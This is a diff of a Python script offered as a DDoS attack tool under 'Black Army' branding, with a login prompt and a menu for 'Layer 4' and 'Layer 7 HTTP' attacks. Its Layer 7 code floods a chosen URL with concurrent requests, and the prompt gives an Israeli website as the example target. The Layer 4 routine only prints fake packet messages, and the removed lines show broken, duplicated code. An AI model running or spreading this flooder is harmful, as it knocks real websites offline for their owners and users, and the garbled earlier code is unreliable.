@@ -51,12 +51,7 @@ def display_header():
         Fore.BLACK + "══════════════════════════════════════════════════════════════════",     
     ]
     for line in header_lines:
-        print(line)
-        time.sleep(0.0015)  # typing effect
-        print(f"\033[37m╔{'═' * 66}╗")
-        print(f"\033[37m║\033[0m \033[41m{' ' * 20} SCRIPT ADMIN BLACK ARMY {' ' * 19}\033[0m \033[37m║")
-        print(f"\033[37m║\033[0m \033[41m  Designt By: KunFay'99{' ' * 41}\033[0m \033[37m║")
-        print(f"\033[37m╚{'═' * 66}╝")
+        print(line)   
     while attemps < 100:
         username = input("\033[100m \033[32m••> Enter your username: \033[33m \033[0m")
         password = input("\033[100m \033[31m••> Enter your password: \033[33m \033[0m")
@@ -68,6 +63,42 @@ def display_header():
             print('Incorrect credentials. Check if you have Caps lock on and try again.')
             attemps += 1
             continue
+        time.sleep(0.0015)  # typing effect
+
+# ============================
+#   Layer 4 Stress Tes
+# ============================
+def layer4_attack(target_ip, duration):
+    print(Fore.RED + f"\n[🔥] Starting Layer 4 attack to {target_ip} for {duration} seconds...\n")
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        port = random.randint(20, 65535)
+        psize = random.randint(64, 1500)
+        print(Fore.YELLOW + f"[L4] Sending {psize} bytes to {target_ip}:{port} 🚀")
+        time.sleep(0.2)
+    print(Fore.GREEN + "\n[✔] Layer 4 attack finished!\n")
+
+# ============================
+#   Layer 7 Stress Test
+# ============================
+async def worker(session, url, stop_time):
+    hits = 0
+    while time.time() < stop_time:
+        try:
+            async with session.get(url) as resp:
+                await resp.text()
+                hits += 1
+                print(Fore.CYAN + f"[L7] Request -> {url} ✅")
+        except:
+            print(Fore.RED + f"[L7] Request failed -> {url} ❌")
+    return hits
+
+async def layer7_attack(url, concurrency, duration):
+    stop_time = time.time() + duration
+    async with aiohttp.ClientSession() as session:
+        tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
+        results = await asyncio.gather(*tasks)
+    print(Fore.GREEN + f"\n[✔] Total requests sent: {sum(results)}")
 
 # ============================
 #   Menu Utama
@@ -79,89 +110,20 @@ def main():
     print(Fore.YELLOW + "1. Layer 4 Attack")
     print(Fore.CYAN + "2. Layer 7 HTTP Attack")
     choice = input(Fore.WHITE + "\nSelect option: ")
-   
-    else: 
-        print(Fore.RED + "\n[!] Invalid choice.")
-    
-#=============================
-#   Layer 4 Stress Tes
-# ============================
-def main():
-    clear()
-    display_header() 
-    header_lines = [
-        Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
-        Fore.CYAN + "╚══════════════════════════════════════════════════════════════",
-              ]
-    if choice == "1":   
-        target_ip = input("===⟩\033[32m IP: \033[33m")
-        duration = int(input("===⟩\033[321m Duration: \033[33m"))
+
+    if choice == "1":
+        target_ip = input("Target IP: ")
+        duration = int(input("Duration (seconds): "))
         layer4_attack(target_ip, duration)
 
-def layer4_attack(target_ip, duration):
-    print(Fore.RED + f"\n[🔥] Starting Layer 4 attack to {target_ip} for {duration} seconds...\n")
-    start_time = time.time()
-    while time.time() - start_time < duration:
-        port = random.randint(20, 65535)
-        CSS = random.randint(64, 1500)
-        print(Fore.YELLOW + f"[] LAYER 4 {Fore.WHITE}ADMIN-HACK {Fore.BLUE} SEN-PACKET {Fore.GREEN} {CSS} {Fore.RED} BYTES TO {target_ip}:{port} {Fore.WHITE}Running ::")
-        print(Fore.RED + f"[] LAYER 4 {Fore.YELLOW}ADMIN-HACK {Fore.CYAN} SEN-PACKET {Fore.YELLOW} {CSS} {Fore.WHITE} BYTES TO {target_ip}:{port} {Fore.GREEN}Running :::")
-        time.sleep(0.2)
-    print(Fore.GREEN + "\n[✔] LAYER 4 \033[1;31m F I N N A L Y  AT T A C K !\n")
-
-# ============================
-#   Layer 7 Stress Test
-# ============================
-def main():
-    clear()
-    display_header()
-    header_lines = [
-        Fore.CYAN + "╔════════════════════════════════════════════════════════════════╗",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╔╗            ╔════╗",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ╔╝╔══╗╚╗",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔╝    ╚╗║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║║       ║║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╚════╝║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║║          ║╔════╗║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "║╚═════╗║║       ║║",
-        Fore.CYAN + "║ \033[100m " + Fore.WHITE + "╚══════╝╚╝       ╚╝",
-        Fore.CYAN + "╚════════════════════════════════════════════════════════════════╝",
-    ]
-   elif choice == "2":
-        url = input("==⟩ \033[32mURL: \033[33m")
-        concurrency = int(input("==⟩ \033[32mSize: \033[33m"))
-        duration = int(input("==⟩ \033[32mDuration: \033[33m"))
+    elif choice == "2":
+        url = input("Target URL (ex: http://israel.co.il): ")
+        concurrency = int(input("Concurrent connections: "))
+        duration = int(input("Duration (seconds): "))
         asyncio.run(layer7_attack(url, concurrency, duration))
-                  
-async def worker(session, url, stop_time):
-    hits = 0
-    while time.time() < stop_time:
-        try:
-            async with session.get(url) as resp:
-                await resp.text()
-                hits += 1
-                print(Fore.RED + f"[÷] {Fore.BLUE} LAYER7 {Fore.CYAN}ADMIN-HACK {Fore.YELLOW}REQUEST-SENT {Fore.RED} {url} {Fore.YELLOW}Running ::")
-                print(Fore.WHITE + f"[÷] {Fore.YELLOW} LAYER7 {Fore.WHITE}ADMIN-HACK {Fore.BLUE}REQUEST-SENT {Fore.YELLOW} {url} {Fore.GREEN}Running :")
-        except:
-            print(Fore.RED + f"[x] {Fore.GREEN}LAYER7 {Fore.YELLOW}Request failed =⟩ {Fore.RED} {url} {Fore.WHITE} Down..!")
-    return hits
 
-async def layer7_attack(url, concurrency, duration):
-    stop_time = time.time() + duration
-    async with aiohttp.ClientSession() as session:
-        tasks = [worker(session, url, stop_time) for _ in range(concurrency)]
-        results = await asyncio.gather(*tasks)
-    print(Fore.WHITE + f"\n[✔] Total requests sent: {sum(results)}")
-    
-
+    else:
+        print(Fore.RED + "\n[!] Invalid choice.")
 
 if __name__ == "__main__":
     main()
